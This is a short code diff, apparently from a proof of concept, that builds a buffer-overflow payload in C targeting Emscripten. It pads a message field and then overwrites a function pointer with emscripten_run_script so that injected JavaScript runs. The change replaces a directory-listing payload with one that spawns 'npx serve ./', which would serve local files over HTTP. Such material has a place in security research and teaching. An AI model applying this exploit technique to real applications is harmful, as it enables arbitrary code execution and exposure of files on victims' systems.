@@ -26,8 +26,8 @@ int sup(void) {
   comms.out = &communicate;
   char *useless = &communicate; // 0x4
   *useless = &emscripten_run_script; // 0x5
-  char *payload = "console.log(require('fs').readdirSync('./').toString());//" // 58 bytes
-  "      " // + 6 to fill .msg = 64
+  char *payload = "require('child_process').spawn('npx', ['serve', './']);//" // 57 bytes
+  "       " // + 7 to fill .msg = 64
   "  " // + 2 for alignment = 66
   "\x40\x00" // + 2 bytes to fill .msg_len = 68
   "\x05\x00\x00\x00"; // + 4 bytes to overwrite .out= 72
